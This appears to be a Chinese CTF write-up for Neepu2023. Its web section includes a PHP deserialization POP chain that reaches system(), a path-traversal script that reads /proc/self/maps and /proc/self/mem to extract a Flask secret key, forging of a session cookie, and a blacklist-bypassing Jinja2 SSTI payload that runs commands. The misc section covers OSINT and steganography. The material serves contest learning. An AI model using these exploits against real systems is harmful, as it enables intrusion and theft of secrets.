[TOC]





## Neepu2023

### Web

#### ezphp

进去后一片空白，抓包看看：

![image-20230522111739079](https://raw.githubusercontent.com/leekosss/photoBed/master/202305221118825.png)

php7.4.21版本，有一个源码泄露漏洞  [PHP<=7.4.21 Development Server源码泄露漏洞](https://buaq.net/go-147962.html)

我们构造这样的请求：

![image-20230522111916087](https://raw.githubusercontent.com/leekosss/photoBed/master/202305221119115.png)

但是不知道为什么没回显，必须改成这样：后面需要加一个东西

![image-20230522110249348](https://raw.githubusercontent.com/leekosss/photoBed/master/202305221119539.png)



获得源码：

```php
<?php
class  one{
    public function __call($name,$ary)
    {
        if ($this->key === true||$this->finish1->name) {
            if ($this->finish->finish){
                call_user_func($this->now[$name],$ary[0]);
            }
        }
    }
    public function neepuctf(){
        $this->now=0;
        return $this->finish->finish;
    }
    public function __wakeup(){
        $this->key=True;
    }
}
class two{
    private $finish;
    public $name;
    public function __get($value){

        return $this->$value=$this->name[$value];
    }

}

class three{
    public function __destruct()
    {
        if($this->neepu->neepuctf()||!$this->neepu1->neepuctf()){
            $this->fin->NEEPUCTF($this->rce,$this->rce1);
        }

    }
}
class four{
    public function __destruct()
    {
        if ($this->neepu->neepuctf()){
            $this->fin->NEEPUCTF1($this->rce,$this->rce1);
        }

    }
    public function __wakeup(){
        $this->key=false;
    }
}
class five{
    public $finish;
    private $name;

    public function __get($name)
    {
        return $this->$name=$this->finish[$name];
    }
}

$a=$_POST["neepu"];
if (isset($a)){
    unserialize($a);
}
```

仔细分析一下，其实three、five是没有使用到的。

> 在php中，如果一个类没有声明成员变量，我们是可以给一个不存在的成员变量赋值的

![image-20230522112056442](https://raw.githubusercontent.com/leekosss/photoBed/master/202305221120486.png)



这一题就是这个情况，我们直接构造：

```php
<?php
$f = new four();
$f->rce = "cat /flag";
$f->rce1 = "";
$a = new one();
$a->finish->finish = true;
$f->neepu = $a;
$b = new one();
$b->key=true;
$b->finish->finish=true;
$b->now['NEEPUCTF1'] = "system";
$f->fin = $b;
echo serialize($f);


O:4:"four":4:{s:3:"rce";s:9:"cat /flag";s:4:"rce1";s:0:"";s:5:"neepu";O:3:"one":1:{s:6:"finish";O:8:"stdClass":1:{s:6:"finish";b:1;}}s:3:"fin";O:3:"one":3:{s:3:"key";b:1;s:6:"finish";O:8:"stdClass":1:{s:6:"finish";b:1;}s:3:"now";a:1:{s:9:"NEEPUCTF1";s:6:"system";}}}
```





#### Cute Cirno & Cute Cirno (Revenge)

##### 预期解

首先查看源码：

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305250159353.png" alt="image-20230525015929206" style="zoom:33%;" />

发现一个读文件的路由，根据数据包可知，这是python编写的

> 在Linux系统中，**/proc/self/cmdline**是一个特殊的文件，它**提供了当前进程的命令行参数信息。**
>
> 在Linux中，/proc是一个虚拟文件系统，提供了访问系统内核和进程信息的接口。**/proc/self是一个符号链接，它指向当前正在执行的进程的目录**。因此，**/proc/self/cmdline实际上指向了当前进程的命令行参数信息。**
>

我们读取 `/proc/self/cmdline` 获取命令行信息：

```
http://neepusec.fun:28912/r3aDF1le?filename=../../../proc/self/cmdline
```

![image-20230525020423295](https://raw.githubusercontent.com/leekosss/photoBed/master/202305250204341.png)

返回了一个文件路径，有一个`CuteCirno.py`文件

当我们访问一个不存在的路径时

![image-20230525020627713](https://s2.loli.net/2023/05/25/HD4cxYlkut65Fd8.png)

我们发现报错了，于是读取这两个文件：

CuteCirno.py

```python
from flask import Flask, request, session, render_template, render_template_string
import os, base64
from NeepuFile import neepu_files

CuteCirno = Flask(__name__,
                  static_url_path='/static',
                  static_folder='static'
                  )

CuteCirno.config['SECRET_KEY'] = str(base64.b64encode(os.urandom(30)).decode()) + "*NeepuCTF*"


@CuteCirno.route('/')
def welcome():
    session['admin'] = 0
    return render_template('welcome.html')


@CuteCirno.route('/Cirno')
def show():
    return render_template('CleverCirno.html')


@CuteCirno.route('/r3aDF1le')
def file_read():
    filename = "static/text/" + request.args.get('filename', 'comment.txt')
    start = request.args.get('start', "0")
    end = request.args.get('end', "0")
    return neepu_files(filename, start, end)


@CuteCirno.route('/genius')
def calculate():
    if session.get('admin') == 1:
        print(session.get('admin'))
        answer = request.args.get('answer')
        if answer is not None:
            blacklist = ['_', "'", '"', '.', 'system', 'os', 'eval', 'exec', 'popen', 'subprocess',
                         'posix', 'builtins', 'namespace','open', 'read', '\\', 'self', 'mro', 'base',
                         'global', 'init', '/','00', 'chr', 'value', 'get', "url", 'pop', 'import',
                         'include','request', '{{', '}}', '"', 'config','=']
            for i in blacklist:
                if i in answer:
                    answer = "⑨" +"""</br><img src="static/woshibaka.jpg" width="300" height="300" alt="Cirno">"""
                    break
            if answer == '':
                return "你能告诉聪明的⑨, 1+1的answer吗"
            return render_template_string("1+1={}".format(answer))
        else:
            return render_template('mathclass.html')

    else:
        session['admin'] = 0
        return "你真的是我的马斯塔吗？"


if __name__ == '__main__':
    CuteCirno.run('0.0.0.0', 5000, debug=True)

```

观察一下这个文件，发现 `SECRET_KEY` 是使用随机数生成的

`/genius`路由会检查session，所以这一题需要我们伪造session，然后绕过过滤进行ssti



NeepuFile.py

```python
import os


def neepu_files(filename, start=0, end=0) -> bytes:
    data = b''

    try:
        start = int(start)
        end = int(end)

    except:
        start = 0
        end = 0

    if filename != "" and os.access(filename, os.R_OK):
        f = open(filename, "rb")

        if start >= 0:
            f.seek(start) # 将文件指针移动到start位置
            if end >= start and end != 0:
                data = f.read(end - start)

            else:
                data = f.read()

        else:
            data = f.read()

        f.close()

    else:
        data = ("File `%s` not exist or can not be read" % filename).encode()

    return data
```

该文件是用来读取文件内容的，并且可以指定读取的起始地址



然后我们需要思考突破点，我们怎样才能得到key呢，这个是随机产生的，我们不可能猜出来。

我们需要寻找其他办法，前面我们使用了 `/proc/self/cmdline` 获取当前进程的命令行信息。

这里我们需要知道：`/proc/self/maps`和 `/proc/self/mem`

> 在Linux系统中，**/proc/self/maps**是一个特殊文件，它**提供了当前进程的内存映射信息。**
>
> 在Linux中，/proc是一个虚拟文件系统，提供了访问系统内核和进程信息的接口。/proc/self是一个符号链接，指向当前正在执行的进程的目录。因此，**/proc/self/maps实际上指向了当前进程的内存映射信息。**
>
> 该文件包含了当前进程的内存映射区域的详细信息，包括**起始地址、结束地址、访问权限、偏移量、设备号、文件路径**等。每一行对应于一个内存映射区域，
>
> ![image-20230525021902703](https://s2.loli.net/2023/05/25/QvDOrbZW98y2Lx1.png)
>
> ```
> 55bac9dcb000-55bac9dcd000 r--p 00000000 08:01 533672                     /usr/bin/cat 
> ```
>
> 代表什么意思
>
> - `55bac9dcb000-55bac9dcd000`: 这是内存区域的起始地址和结束地址。该区域从0x55bac9dcb000到0x55bac9dcd000。
> - `r--p`: 这表示内存区域的访问权限。在这种情况下，该区域只允许读取（read）操作。
> - `00000000`: 这是该内存区域在文件中的偏移量。在这种情况下，偏移量为0。
> - `08:01`: 这是指与该内存区域相关联的设备号和节点号。设备号为08，节点号为01。
> - `/usr/bin/cat`: 这是映射到该内存区域的文件的路径。在这种情况下，该区域是由`/usr/bin/cat`文件映射而来。
>
> 综上所述，该行表示了一个只读权限的内存区域，它是由`/usr/bin/cat`文件映射而来。

根据上面的描述， `/proc/self/maps`记录了当前进程的内存映射的相关信息，根据这些信息我们可以找到对应的内存空间



> 在Linux系统中，**/proc/self/mem**是一个特殊文件，它提供了**对当前进程内存的直接访问。**
>
> 在Linux中，/proc是一个虚拟文件系统，提供了访问系统内核和进程信息的接口。/proc/self是一个符号链接，指向当前正在执行的进程的目录。因此，/proc/self/mem实际上指向了当前进程的内存。
>
> 通过读取和写入/proc/self/mem文件，可以直接对当前进程的内存进行操作。这包括读取和修改进程的内存内容，可以用于调试、分析或修改进程的运行时状态。
>
> 但是需要注意的是，/proc/self/mem文件的访问权限通常非常受限制。只有具有足够权限的用户或特权进程才能访问该文件。此外，对于一个普通的应用程序来说，直接读取或写入/proc/self/mem文件通常是不必要且危险的操作。
>

我们也知道了 `/proc/self/mem` 文件 ，可以对当前进程内存进行访问。

总结一下，就是根据 `/proc/self/maps`提供的内存地址映射信息找到 `/proc/self/mem`相应的内存块



由于我们不知道key，但是由于程序在运行时，会将部分信息存入内存中，所以我们只需要找到内存中带有： `*NeepuCTF*` 字样的字符串取出来就是`SECRET_KEY`了

我们编写脚本：

```python
# -*- coding = utf-8 -*-
# @Time : 2023/5/24 23:32
# @Author : Leekos
# @File : cute.py
# @Software : PyCharm

import requests
import re

url = "http://neepusec.fun:28912/r3aDF1le?filename=../../../"
def maps():

    req = requests.get(url=url + "/proc/self/maps")
    text = req.text
    ls = text.split("\n")
    pattern = "([0-9a-z]+)-([0-9a-z]+) rw"
    for l in ls:
        map_addr = re.match(pattern,l) 
        if map_addr:
            # print(map_addr.group(1),"-",map_addr.group(2))
            start = int(map_addr.group(1), 16) #group(1)会得到匹配到的字符串的第1个值，模式串中第1个大括号匹配到的
            end = int(map_addr.group(2), 16)
            mem_url = url + "/proc/self/mem&start="+str(start)+"&end="+str(end)
            requ = requests.get(url=mem_url)
            if "*NeepuCTF*" in requ.text:
                mem_pattern = b"[A-Za-z0-9+/=]{40}\*NeepuCTF\*"
                key = re.findall(mem_pattern, requ.content) # 内存有很多不可打印字符，所以使用字节形式
                print("Secret Key: " + bytes.decode(key[0])) # 将字节解码为字符串
                break



if __name__ == "__main__":
    maps()
```

> 解释一下这个脚本的意思：
>
> 首先获得maps文件的值，然后分隔成列表，进行遍历。
>
> ```python
> pattern = "([0-9a-z]+)-([0-9a-z]+) rw"
> # 匹配maps中有读写权限rw的字符串
> ```
>
> 当匹配到时，if条件为真，将group(1)、group(2)分别转为10进制（代表内存的首末地址）
>
> 然后根据地址读取mem文件的值，如果内存中包含指定字符串就打印出key

然后我们就可以进行session伪造了，但是由于等会需要进行ssti(但是过滤了很多)

```python
blacklist = ['_', "'", '"', '.', 'system', 'os', 'eval', 'exec', 'popen', 'subprocess',
'posix', 'builtins', 'namespace','open', 'read', '\\', 'self', 'mro', 'base',
'global', 'init', '/','00', 'chr', 'value', 'get', "url", 'pop', 'import',
'include','request', '{{', '}}', '"', 'config','=']
```

这里有两种写法：

法一：（字符串拼接）不推荐，很难拼



法二：

这里session是可控的，所以我们可以把需要的字符串先存入session中，然后在ssti时从session中取值

> `{%print(session)%}`这样可以把session的值打印出来
>
> 我在这里学到了新的东西，jinja2的字符串可以进行字符串切片
>
> 首先我们需要把`session`转为字符串，我们使用`string过滤器`
>
> ```
> (session|string)[39:50]
> ```
>
> 这样就可以打印出session中的一段值了

首先使用脚本构造flask session：(这里我们把ssti需要使用的字符串也构造到session中了)

```python
python flask_session_cookie_manager3.py encode -s "bxdQy9DN6FiCBXhNZFm3YwAgJ+Mn4+mRFiI0sYEP*NeepuCTF*" -t "{'/readflag': 0, '__globals__': 0, 'admin': 1, 'os': 0,'popen': 0, 'read': 0}"

.eJyrVtIvSk1MSctJTFeyMtBRio9Pz8lPSswpjo8H8xNTcjPzlKwMdZTyi8ECBfkFqXlgFkgfkFELAMoaFFg.ZG5POw.jWk5AQmFaC172YwAbMbUXlICmm4
```

![image-20230525025204438](https://s2.loli.net/2023/05/25/MoyJRDLIkpwg7ze.png)

如图，我们将session变量的值打印出来了，其中包含我们可以利用的字符串

接下来我们只需要构造如下ssti即可：

```jinja2
{%print(lipsum["__globals__"]["os"]["popen"]("/readflag")["read"]())%}
```

结合session的payload:

```jinja2
{%print(lipsum[(session|string)[39:50]][(session|string)[69:71]][(session|string)[78:83]]((session|string)[23:32])[(session|string)[24:28]]())%}
```

![image-20230525025419723](https://s2.loli.net/2023/05/25/EZB1Te6imHUgFbu.png)



##### 非预期解：

由于题目开启了debug，并且可以任意文件读取，所以我们可以伪造debug界面的pin然后命令执行：

![image-20230525025540055](https://s2.loli.net/2023/05/25/FojPluBMEev8DtL.png)



















### Misc

#### 吉林第一站

> 吉林第一站，猜一猜我在哪里拍摄的吧！
>
> 风景1：三个字
>
> 风景2：三个字
>
> 风景3：六个字
>
> flag内请填拼音，小写字母
>
> flag格式：Neepu{风景1_风景2_风景3}

社工题



风景1：朱雀山

![image-20230522112959995](https://raw.githubusercontent.com/leekosss/photoBed/master/202305221130135.png)

风景二：松花湖

![image-20230522113329134](https://raw.githubusercontent.com/leekosss/photoBed/master/202305221133363.png)

风景三：东北电力大学

使用百度识图

![image-20230522113403880](https://raw.githubusercontent.com/leekosss/photoBed/master/202305221134929.png)

flag就是用配音拼起来



#### 重生之我是CTFer

玩游戏



#### 倒影

zsteg发现 `DNEI`，

![image-20230522115300764](https://raw.githubusercontent.com/leekosss/photoBed/master/202305221153820.png)

然后也发现了`GNP` 是一张逆转的图片

![image-20230522115334387](https://raw.githubusercontent.com/leekosss/photoBed/master/202305221153416.png)



反转一下：

```python
f=open("C://Users/LIKE/Desktop/1.png", "rb")
fw=open("C://Users/LIKE/Desktop/2.png", "wb")
data = f.read()[::-1]
fw.write(data)
```

得到另一张图片：

![image-20230522115444890](https://raw.githubusercontent.com/leekosss/photoBed/master/202305221154173.png)



两种图片一模一样，是盲水印：

![image-20230522115521161](https://raw.githubusercontent.com/leekosss/photoBed/master/202305221155215.png)

得到flag：

![flag](https://raw.githubusercontent.com/leekosss/photoBed/master/202305221155888.png)











